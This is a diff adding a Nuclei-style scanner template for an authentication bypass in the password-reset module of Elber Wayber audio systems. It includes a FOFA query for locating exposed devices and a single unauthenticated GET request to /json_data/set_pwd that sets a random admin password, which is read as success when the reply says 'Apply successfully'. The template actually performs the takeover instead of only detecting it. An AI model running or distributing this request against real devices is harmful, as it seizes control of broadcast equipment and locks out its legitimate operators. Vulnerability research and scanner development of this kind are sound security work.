@@ -1,0 +1,32 @@
+id: Elber-Wayber-Password-Reset
+
+info:
+  name: "Elber Wayber 模拟/数字音频系统密码重置身份验证绕过"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: title="Elber Satellite Equipment" || body="www.elber.it"
+    Elber Wayber 模拟/数字音频系统密码重置模块存在身份验证逻辑缺陷。攻击者可通过该缺陷绕过多因素认证流程，直接执行密码修改操作，进而获得目标系统的完全控制权限。该漏洞允许未经授权的用户接管账户，导致敏感数据泄露、系统配置篡改及任意恶意操作的执行。
+  reference:
+  - https://mp.weixin.qq.com/s/aFrc2mlOuPibI7oHETZomg
+  tags: Elber Wayber
+
+
+variables:
+  password: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+http:
+- raw:
+  - |
+    GET /json_data/set_pwd?lev=2&pass={{password}} HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'Apply successfully'
+  - type: status
+    status:
+    - 200
